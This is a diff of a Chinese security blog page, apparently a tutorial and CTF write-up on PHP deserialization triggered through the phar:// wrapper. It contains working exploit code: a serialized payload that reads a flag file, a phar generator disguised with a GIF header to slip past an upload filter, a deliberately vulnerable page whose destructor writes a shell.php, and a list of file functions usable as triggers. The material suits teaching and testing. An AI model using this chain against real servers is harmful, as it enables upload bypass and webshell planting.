-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><p>最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。</p>
+<pre><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php));&quot;;}</code></pre><p>得到flag</p>
+<pre><code>CTF{4d96e37f4be998c50aa586de4ada354a}</code></pre><h2 id="phar伪协议触发php反序列化"><a href="#phar伪协议触发php反序列化" class="headerlink" title="phar伪协议触发php反序列化"></a>phar伪协议触发php反序列化</h2><p>最近Black Hat比较热的一个议题：It’s a PHP unserialization vulnerability Jim, but not as we know it。参考了创宇的文章，这里笔者把它作为php反序列化的最后一个模块，希望日后能在以上的几种反序列化之外拓宽新的思路。</p>
 <h3 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h3><p>可以将多个文件归入一个本地文件夹，也可以包含一个文件</p>
 <h3 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h3><p>PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。所有PHAR文件都使用.phar作为文件扩展名，PHAR格式的归档需要使用自己写的PHP代码。</p>
 <h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>详情参考php手册(<a href="https://secure.php.net/phar" target="_blank" rel="noopener">https://secure.php.net/phar</a>)</p>
@@ -919,31 +1467,81 @@
 <p>4、[optional] a signature for verifying Phar integrity (phar file format only)<br>签名，放在文件末尾。对应函数Phar :: stopBuffering –停止缓冲对Phar存档的写入请求，并将更改保存到磁盘</p>
 <h3 id="Phar内置方法"><a href="#Phar内置方法" class="headerlink" title="Phar内置方法"></a>Phar内置方法</h3><p>要想使用Phar类里的方法，必须将phar.readonly配置项配置为0或Off（文档中定义）</p>
 <p>PHP内置phar类，其他的一些方法如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$phar = new Phar(&apos;phar/hpdoger.phar&apos;); //实例一个phar对象供后续操作</span><br><span class="line">$phar-&gt;startBuffering()  //开始缓冲Phar写操作</span><br><span class="line">$phar-&gt;addFromString(&apos;test.php&apos;,&apos;&lt;?php echo \&apos;this is test file\&apos;;&apos;); //以字符串的形式添加一个文件到 phar 档案</span><br><span class="line">$phar-&gt;buildFromDirectory(&apos;fileTophar&apos;) //把一个目录下的文件归档到phar档案</span><br><span class="line">$phar-&gt;extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞剖析-2"><a href="#漏洞剖析-2" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些<strong>文件操作函数</strong>执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
+<pre><code>$phar = new Phar(&#39;phar/hpdoger.phar&#39;); //实例一个phar对象供后续操作
+$phar-&gt;startBuffering()  //开始缓冲Phar写操作
+$phar-&gt;addFromString(&#39;test.php&#39;,&#39;&lt;?php echo \&#39;this is test file\&#39;;&#39;); //以字符串的形式添加一个文件到 phar 档案
+$phar-&gt;buildFromDirectory(&#39;fileTophar&#39;) //把一个目录下的文件归档到phar档案
+$phar-&gt;extractTo()  //解压一个phar包的函数，extractTo 提取phar文档内容</code></pre><h3 id="漏洞剖析-2"><a href="#漏洞剖析-2" class="headerlink" title="漏洞剖析"></a>漏洞剖析</h3><p>文件的第二部分a manifest describing the contents可知，phar文件会以序列化的形式存储用户自定义的meta-data，在一些<strong>文件操作函数</strong>执行的参数可控，参数部分我们利用Phar伪协议，可以不依赖unserialize()直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的。</p>
 <p>而在一些上传点，我们可以更改phar的文件头并且修改其后缀名绕过检测，如：test.gif，里面的meta-data却是我们提前写入的恶意代码，而且可利用的<strong>文件操作函数</strong>又很多，所以这是一种不错的绕过+执行的方法。</p>
 <h3 id="文件上传绕过deomo"><a href="#文件上传绕过deomo" class="headerlink" title="文件上传绕过deomo"></a>文件上传绕过deomo</h3><p>自己写了个丑陋的代码，只允许gif文件上传（实则有其他方法绕过，这里不赘述），代码部分如下</p>
 <p><strong>前端上传：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;form action=&quot;http://localhost/test/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;hpdoger&quot;&gt;
+    &lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;
+&lt;/form&gt;</code></pre><p><strong>后端验证：</strong></p>
+<pre><code>/*upload.php*/
+&lt;?php
+    /*返回后缀名函数*/
+    function getExt($filename){
+        return substr($filename,strripos($filename,&#39;.&#39;)+1);
+    }
 
-<p><strong>后端验证：</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/*upload.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">	/*返回后缀名函数*/</span><br><span class="line">	function getExt($filename)&#123;</span><br><span class="line">		return substr($filename,strripos($filename,&apos;.&apos;)+1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*检测MIME类型是否为gif*/</span><br><span class="line">	if($_FILES[&apos;hpdoger&apos;][&apos;type&apos;] != &quot;image/gif&quot;)&#123;</span><br><span class="line">		echo &quot;Not allowed !&quot;;</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		$filenameExt = strtolower(getExt($_FILES[&apos;hpdoger&apos;][&apos;name&apos;]));	/*提取后缀名*/</span><br><span class="line">		</span><br><span class="line">		if($filenameExt != &apos;gif&apos;)&#123;</span><br><span class="line">			echo &quot;Not gif !&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			move_uploaded_file($_FILES[&apos;hpdoger&apos;][&apos;tmp_name&apos;], $_FILES[&apos;hpdoger&apos;][&apos;name&apos;]);</span><br><span class="line">			echo &quot;Successfully！&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    /*检测MIME类型是否为gif*/
+    if($_FILES[&#39;hpdoger&#39;][&#39;type&#39;] != &quot;image/gif&quot;){
+        echo &quot;Not allowed !&quot;;
+        exit;
+    }
+    else{
+        $filenameExt = strtolower(getExt($_FILES[&#39;hpdoger&#39;][&#39;name&#39;]));    /*提取后缀名*/
 
-<p>代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：<br>直接上传php<br><img src="https://i.loli.net/2018/09/07/5b9280161ed92.png" alt></p>
+        if($filenameExt != &#39;gif&#39;){
+            echo &quot;Not gif !&quot;;
+        }
+        else{
+            move_uploaded_file($_FILES[&#39;hpdoger&#39;][&#39;tmp_name&#39;], $_FILES[&#39;hpdoger&#39;][&#39;name&#39;]);
+            echo &quot;Successfully！&quot;;
+        }
+    }
+?&gt;</code></pre><p>代码判断了MIME类型+后缀判断，如下是我测试php文件的两个结果：<br>直接上传php<br><img src="https://i.loli.net/2018/09/07/5b9280161ed92.png" alt></p>
 <p>抓包更改content-type为 image/gif再次上传<br><img src="https://i.loli.net/2018/09/07/5b9280606915f.png" alt><br><img src="https://i.loli.net/2018/09/07/5b9280606784b.png" alt></p>
 <p>可以看到两次都被拒绝上传,那我们更改phar后缀名再次上传</p>
 <p>php环境编译生成一个phar文件，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class not_useful&#123;</span><br><span class="line">	var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;hpdoger.phar&quot;);</span><br><span class="line">$test = new not_useful();</span><br><span class="line">$phar = new Phar(&quot;hpdoger.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php 
+class not_useful{
+    var $file = &quot;&lt;?php phpinfo() ?&gt;&quot;;
+}
 
-<p>这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下<br><img src="https://i.loli.net/2018/09/07/5b92801620631.png" alt></p>
+@unlink(&quot;hpdoger.phar&quot;);
+$test = new not_useful();
+$phar = new Phar(&quot;hpdoger.phar&quot;);
+
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头
+$phar-&gt;setMetadata($test);
+$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);
+
+$phar-&gt;stopBuffering();
+?&gt;</code></pre><p>这里实例的类是为后面的demo做铺垫，php文件同目录下生成hpdoger.phar文件，我们更改名称为hpdoger.gif看一下<br><img src="https://i.loli.net/2018/09/07/5b92801620631.png" alt></p>
 <p>gif头、phar识别序列、序列化后的字符串都具备</p>
 <p>上传一下看能否成功,成功绕过检测在服务端存储一个hpdoger.gif<br><img src="https://i.loli.net/2018/09/07/5b92808e8c0bf.png" alt></p>
 <h3 id="利用Phar-伪协议demo"><a href="#利用Phar-伪协议demo" class="headerlink" title="利用Phar://伪协议demo"></a>利用Phar://伪协议demo</h3><p>我们已经上传了可解析的phar文件，现在需要找到一个文件操作函数的页面来利用，这里笔者写一个比较鸡肋的页面，目的是还原流程而非真实情况。</p>
 <p>代码如下:reapperance.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$recieve = $_GET[&apos;recieve&apos;];</span><br><span class="line">	</span><br><span class="line">	/*写入文件类操作*/</span><br><span class="line">	class not_useful&#123;</span><br><span class="line">		var $file;</span><br><span class="line"></span><br><span class="line">		function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;); //自定义写入路径</span><br><span class="line">		fputs($fp,$this-&gt;file);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file_get_contents($recieve);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+    $recieve = $_GET[&#39;recieve&#39;];
 
-<p>$recieve可控，符合我们的利用条件。那我们构造payload:<br><img src="https://i.loli.net/2018/09/07/5b92808e8a8ae.png" alt></p>
+    /*写入文件类操作*/
+    class not_useful{
+        var $file;
+
+        function __destruct(){
+        $fp = fopen(&quot;D:\\phpStudy\\PHPTutorial\\WWW\\test\\shell.php&quot;,&quot;w&quot;); //自定义写入路径
+        fputs($fp,$this-&gt;file);
+        fclose($fp);
+    }
+
+    file_get_contents($recieve);
+
+?&gt;</code></pre><p>$recieve可控，符合我们的利用条件。那我们构造payload:<br><img src="https://i.loli.net/2018/09/07/5b92808e8a8ae.png" alt></p>
 <p>若执行成功，会将刚才写入meta-data数据里面序列化的类进行反序列化，并且实例了$file成员，导致文件写入，成功写入如下：<br><img src="https://i.loli.net/2018/09/07/5b92808e93634.png" alt></p>
 <h3 id="可利用的文件操作函数"><a href="#可利用的文件操作函数" class="headerlink" title="可利用的文件操作函数"></a>可利用的文件操作函数</h3><p>fileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile、md5_file、filesize</p>
 <h3 id="各种文件头"><a href="#各种文件头" class="headerlink" title="各种文件头"></a>各种文件头</h3><table>
@@ -976,7 +1574,7 @@
             </div>
             <div class="continue">
             <a href="/2018/09/13/四个实例递进php反序列化/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -984,7 +1582,7 @@
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
   </nav>
 
     </main>
